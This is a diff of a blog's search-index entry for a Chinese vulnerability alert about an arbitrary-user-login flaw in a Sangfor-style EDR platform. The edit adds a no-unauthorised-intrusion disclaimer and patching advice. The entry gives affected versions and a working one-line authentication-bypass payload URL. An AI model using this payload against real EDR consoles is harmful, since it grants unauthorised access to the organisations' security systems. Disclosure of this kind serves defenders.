@@ -3,12 +3,13 @@
   <entry>
     <title>某信服EDR终端检测平台存在任意用户登录漏洞</title>
     <url>/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试</p>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。</p>
+<p>注：禁止非授权入侵</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload: <a href="https://ip/ui/login.php?user=arbitrarily" target="_blank" rel="noopener">https://ip/ui/login.php?user=arbitrarily</a></p>
 <h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="0.png" alt="0"></p>
 <p>利用payload进行任意登录</p>
 <p><img src="1.png" alt="1"></p>
-<p>注：禁止非授权入侵</p>
+<h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>及时进行更新，关注官网补丁信息。</p>
 ]]></content>
       <categories>
         <category>漏洞告警</category>
